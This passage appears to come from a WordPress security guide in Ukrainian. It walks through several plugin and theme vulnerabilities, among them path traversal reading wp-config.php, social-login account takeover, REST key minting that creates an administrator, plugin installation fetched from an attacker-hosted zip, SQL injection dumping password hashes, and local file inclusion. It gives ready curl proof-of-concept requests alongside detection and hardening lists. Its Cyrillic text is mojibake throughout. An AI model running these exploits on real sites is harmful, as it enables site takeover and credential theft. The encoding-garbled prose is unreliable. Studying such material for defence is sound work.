`$file_name` –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∞—Ç–∞–∫—É—é—á–∏–º —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è **–±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó**. –ó–Ω–æ–≤—É –∂, —î–¥–∏–Ω–∏–º –±–∞—Ä'—î—Ä–æ–º —î **CSRF nonce**, —è–∫–∏–π –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —Ä–µ–∑—é–º–µ.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
–°–µ—Ä–≤–µ—Ä –ø–æ–≤–µ—Ä—Ç–∞—î –≤–º—ñ—Å—Ç `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

–ë–∞–≥–∞—Ç–æ —Ç–µ–º/–ø–ª–∞–≥—ñ–Ω—ñ–≤ –º—ñ—Å—Ç—è—Ç—å "social login" helpers, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ admin-ajax.php. –Ø–∫—â–æ unauthenticated AJAX action (wp_ajax_nopriv_...) –¥–æ–≤—ñ—Ä—è—î client-supplied identifiers, –∫–æ–ª–∏ provider data –≤—ñ–¥—Å—É—Ç–Ω—ñ, —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—î wp_set_auth_cookie(), —Ü–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ full authentication bypass.

–¢–∏–ø–æ–≤–∏–π –ø—Ä–æ–±–ª–µ–º–Ω–∏–π —à–∞–±–ª–æ–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why it‚Äôs exploitable

- –î–æ—Å—Ç—É–ø–Ω–∞ –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ admin-ajax.php (–¥—ñ—è wp_ajax_nopriv_‚Ä¶).
- –í—ñ–¥—Å—É—Ç–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ nonce/capability –ø–µ—Ä–µ–¥ –∑–º—ñ–Ω–æ—é —Å—Ç–∞–Ω—É.
- –í—ñ–¥—Å—É—Ç–Ω—è –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ OAuth/OpenID; –≥—ñ–ª–∫–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—Ä–∏–π–º–∞—î –≤–≤–µ–¥–µ–Ω–Ω—è –≤—ñ–¥ –Ω–∞–ø–∞–¥–Ω–∏–∫–∞.
- get_user_by('email', $_POST['id']) —É –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ wp_set_auth_cookie($uid) –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ –±—É–¥—å-—è–∫—É —ñ—Å–Ω—É—é—á—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É.

Exploitation (unauthenticated)

- –ü–µ—Ä–µ–¥—É–º–æ–≤–∏: –Ω–∞–ø–∞–¥–Ω–∏–∫ –º–∞—î –¥–æ—Å—Ç—É–ø –¥–æ /wp-admin/admin-ajax.php —ñ –∑–Ω–∞—î/–≤–≥–∞–¥—É—î –¥—ñ–π—Å–Ω—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å provider —É –Ω–µ–ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è (–∞–±–æ –æ–ø—É—Å—Ç—ñ—Ç—å –π–æ–≥–æ), —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ –≥—ñ–ª–∫—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —ñ –ø–µ—Ä–µ–¥–∞—Ç–∏ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
–û—á—ñ–∫—É–≤–∞–Ω—ñ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏ —É—Å–ø—ñ—Ö—É

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

–ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –Ω–∞–∑–≤–∏ action

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- –®—É–∫–∞–π—Ç–µ wp_set_auth_cookie(), get_user_by('email', ...) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ AJAX-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤.

–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –í–µ–±-–ª–æ–≥–∏, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ POST-–∑–∞–ø–∏—Ç–∏ –¥–æ /wp-admin/admin-ajax.php –∑ action social-login —ñ id=<email>.
- 200-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ success JSON –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –∑ —Ç—ñ—î—ó –∂ IP/User-Agent.

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è

- –ù–µ –≤–∏–≤–æ–¥—å—Ç–µ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —ñ–∑ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–ª—ñ—î–Ω—Ç–∞. –ü—Ä–∏–π–º–∞–π—Ç–µ –ª–∏—à–µ emails/IDs, —â–æ –ø–æ—Ö–æ–¥—è—Ç—å –≤—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ–≥–æ provider token/ID.
- –í–∏–º–∞–≥–∞–π—Ç–µ CSRF nonces —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –Ω–∞–≤—ñ—Ç—å –¥–ª—è login helpers; —É–Ω–∏–∫–∞–π—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó wp_ajax_nopriv_ —è–∫—â–æ —Ü–µ –Ω–µ —Å—É–≤–æ—Ä–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ.
- –í–∞–ª—ñ–¥—É–π—Ç–µ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ OAuth/OIDC –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ; –≤—ñ–¥—Ö–∏–ª—è–π—Ç–µ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Ö/–Ω–µ–¥—ñ–π—Å–Ω–∏—Ö –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ñ–≤ (–±–µ–∑ fallback –Ω–∞ POST id).
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ —Ç–∏–º—á–∞—Å–æ–≤–µ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è social login –∞–±–æ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–µ –ø–∞—Ç—á–µ–Ω–Ω—è –Ω–∞ –∫—Ä–∞—é (–±–ª–æ–∫—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–π action) –¥–æ–∫–∏ –Ω–µ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ.

–ü–æ–≤–µ–¥—ñ–Ω–∫–∞ –ø—ñ—Å–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –≤–∏—Å—Ç–∞–≤–ª—è—é—Ç—å REST endpoints, —è–∫—ñ –≥–µ–Ω–µ—Ä—É—é—Ç—å –±–∞–≥–∞—Ç–æ—Ä–∞–∑–æ–≤—ñ ‚Äúconnection keys‚Äù –∞–±–æ —Ç–æ–∫–µ–Ω–∏ –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –≤–∏–∫–ª–∏–∫–∞—á–∞. –Ø–∫—â–æ –º–∞—Ä—à—Ä—É—Ç –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –ª–∏—à–µ –∑–∞ –≤–≥–∞–¥—É–≤–∞–Ω–∏–º –∞—Ç—Ä–∏–±—É—Ç–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, username) —ñ –Ω–µ –ø—Ä–∏–≤'—è–∑—É—î –∫–ª—é—á –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/—Å–µ—Å—ñ—ó –∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞–º–∏ capability, –±—É–¥—å-—è–∫–∏–π –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∫–ª—é—á —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó (—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è admin-–∞–∫–∞—É–Ω—Ç—É, –¥—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì –∑–≥–µ–Ω–µ—Ä—É–π—Ç–µ connection key —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –π–æ–≥–æ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
–ß–æ–º—É —Ü–µ –µ–∫—Å–ø–ª–æ–π—Ç–∞–±–µ–ª—å–Ω–æ
- –ß—É—Ç–ª–∏–≤–∏–π REST route –∑–∞—Ö–∏—â–µ–Ω–∏–π —Ç—ñ–ª—å–∫–∏ –Ω–∏–∑—å–∫–æ–µ–Ω—Ç—Ä–æ–ø—ñ–π–Ω–∏–º –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è–º –æ—Å–æ–±–∏ (username) –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ–º permission_callback
- –í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ capability; —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∫–ª—é—á –ø—Ä–∏–π–º–∞—î—Ç—å—Å—è —è–∫ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–π –æ–±—Ö—ñ–¥

Detection checklist
- –®—É–∫–∞—Ç–∏ –≤ –∫–æ–¥—ñ –ø–ª–∞–≥—ñ–Ω–∞ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- –ë—É–¥—å-—è–∫–∏–π route, —è–∫–∏–π –≤–∏–¥–∞—î tokens/keys –Ω–∞ –æ—Å–Ω–æ–≤—ñ identity –∑ –∑–∞–ø–∏—Ç—É (username/email) –±–µ–∑ –ø—Ä–∏–≤‚Äô—è–∑–∫–∏ –¥–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ capability
- –®—É–∫–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏, —â–æ –ø—Ä–∏–π–º–∞—é—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω–∏–π token/key –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ

Hardening
- –î–ª—è –±—É–¥—å-—è–∫–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ REST route: –≤–∏–º–∞–≥–∞—Ç–∏ permission_callback, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î current_user_can() –¥–ª—è –ø–æ—Ç—Ä—ñ–±–Ω–æ—ó capability
- –ù–µ —Å—Ç–≤–æ—Ä—é–π—Ç–µ long-lived keys –Ω–∞ –æ—Å–Ω–æ–≤—ñ identity, –Ω–∞–¥–∞–Ω–æ—ó –∫–ª—ñ—î–Ω—Ç–æ–º; –∑–∞ –ø–æ—Ç—Ä–µ–±–∏ –≤–∏–¥–∞–≤–∞–π—Ç–µ short-lived, user-bound tokens –ø—ñ—Å–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ capability –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ
- –ü–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–∏–∫–ª–∏–∫—É (wp_set_current_user —Å–∞–º –ø–æ —Å–æ–±—ñ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—ñ–π) —ñ –≤—ñ–¥–∫–∏–¥–∞–π—Ç–µ –∑–∞–ø–∏—Ç–∏, –¥–µ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ –¥–æ–≤—ñ–ª—å–Ω–∞ —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—è –ø–ª–∞–≥—ñ–Ω–∞ (FunnelKit Automations ‚â§ 3.5.3)

Nonces –∑–∞—Ö–∏—â–∞—é—Ç—å –≤—ñ–¥ CSRF, –∞ –Ω–µ –≤—ñ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –Ø–∫—â–æ –∫–æ–¥ —Å–ø—Ä–∏–π–º–∞—î –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è nonce —è–∫ –¥–æ–∑–≤—ñ–ª —ñ –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –¥–ª—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, install/activate plugins), –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ —Å–ª–∞–±–∫—É –ø–µ—Ä–µ–≤—ñ—Ä–∫—É nonce —ñ –¥–æ—Å—è–≥—Ç–∏ RCE, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –ø–ª–∞–≥—ñ–Ω —ñ–∑ –±–µ–∫–¥–æ—Ä–æ–º –∞–±–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–ª–∞–≥—ñ–Ω.

- –£—Ä–∞–∑–ª–∏–≤–∏–π —à–ª—è—Ö: plugin/install_and_activate
- –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å: —Å–ª–∞–±–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce hash; –≤—ñ–¥—Å—É—Ç–Ω—è current_user_can('install_plugins'|'activate_plugins') –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ nonce ¬´–ø—Ä–æ—Ö–æ–¥–∏—Ç—å¬ª
- –ù–∞—Å–ª—ñ–¥–æ–∫: –ø–æ–≤–Ω–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –¥–æ–≤—ñ–ª—å–Ω—É —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—é/–∞–∫—Ç–∏–≤–∞—Ü—ñ—é –ø–ª–∞–≥—ñ–Ω–∞

PoC (—Ñ–æ—Ä–º–∞ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –ø–ª–∞–≥—ñ–Ω–∞; –Ω–∞–≤–µ–¥–µ–Ω–æ —ñ–ª—é—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## –ù–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π SQLi —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) –≤ depicter-* actions (Depicter Slider ‚â§ 3.6.1)

–ö—ñ–ª—å–∫–∞ depicter-* actions –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞–ª–∏ –π–æ–≥–æ –≤ SQL-–∑–∞–ø–∏—Ç–∏ –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–∞—Ü—ñ—ó.

- –ü–∞—Ä–∞–º–µ—Ç—Ä: s (search)
- –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å: –ø—Ä—è–º–µ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞–Ω–Ω—è —Ä—è–¥–∫—ñ–≤ —É WHERE/LIKE –∫–ª–∞—É–∑–∞x; –≤—ñ–¥—Å—É—Ç–Ω—ñ prepared statements/—Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—è
- –ù–∞—Å–ª—ñ–¥–æ–∫: –µ–∫–∑—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
–ö–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π —Å–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è
- Grep –¥–ª—è depicter-* action handlers —Ç–∞ –ø—Ä—è–º–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è $_GET['s'] –∞–±–æ $_POST['s'] –≤ SQL
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–ø–∏—Ç–∏, –ø–µ—Ä–µ–¥–∞–Ω—ñ –≤ $wpdb->get_results()/query(), —è–∫—ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—é—Ç—å s

–ü—ñ–¥—Å–∏–ª–µ–Ω–Ω—è –∑–∞—Ö–∏—Å—Ç—É
- –ó–∞–≤–∂–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ $wpdb->prepare() –∞–±–æ wpdb placeholders; –≤—ñ–¥—Ö–∏–ª—è–π—Ç–µ –Ω–µ–±–∞–∂–∞–Ω—ñ –º–µ—Ç–∞—Å–∏–º–≤–æ–ª–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞
- –î–æ–¥–∞–π—Ç–µ —Å—Ç—Ä–æ–≥–∏–π allowlist –¥–ª—è s —ñ –Ω–æ—Ä–º–∞–ª—ñ–∑—É–π—Ç–µ –¥–æ –æ—á—ñ–∫—É–≤–∞–Ω–æ–≥–æ charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

–ü—Ä–∏–π–æ–º —à–ª—è—Ö—ñ–≤, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫–æ–º, —É –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ —à–∞–±–ª–æ–Ω—É –±–µ–∑ –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó/–æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î —á–∏—Ç–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏, –∞ —ñ–Ω–æ–¥—ñ ‚Äî code execution, —è–∫—â–æ –¥–æ runtime –ø—ñ–¥—Ç—è–≥—É—é—Ç—å—Å—è includable PHP/log —Ñ–∞–π–ª–∏.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: –Ω–µ–º–∞—î –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó/allowlisting; traversal –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π
- Impact: —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ (wp-config.php), potential RCE —É —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö (log poisoning, includable PHP)

PoC ‚Äì –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- –ë—É–¥—å-—è–∫–∏–π handler, —â–æ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î —à–ª—è—Ö–∏ –∑–∞–ø–∏—Ç—ñ–≤ —É include()/require()/read sinks –±–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ realpath()
- –®—É–∫–∞–π—Ç–µ traversal-–ø–∞—Ç–µ—Ä–Ω–∏ (../), —â–æ –≤–∏—Ö–æ–¥—è—Ç—å –∑–∞ –º–µ–∂—ñ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É templates

Hardening
- –ó–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ allowlisted templates; –≤–∏–∑–Ω–∞—á–∞–π—Ç–µ —à–ª—è—Ö —á–µ—Ä–µ–∑ realpath() —ñ –≤–∏–º–∞–≥–∞–π—Ç–µ str_starts_with(realpath(file), realpath(allowed_base))
- –ù–æ—Ä–º–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ; –≤—ñ–¥—Ö–∏–ª—è—Ç–∏ traversal-–ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —Ç–∞ –∞–±—Å–æ–ª—é—Ç–Ω—ñ —à–ª—è—Ö–∏; –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ sanitize_file_name() —Ç—ñ–ª—å–∫–∏ –¥–ª—è —ñ–º–µ–Ω —Ñ–∞–π–ª—ñ–≤ (–Ω–µ –¥–ª—è –ø–æ–≤–Ω–∏—Ö —à–ª—è—Ö—ñ–≤)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
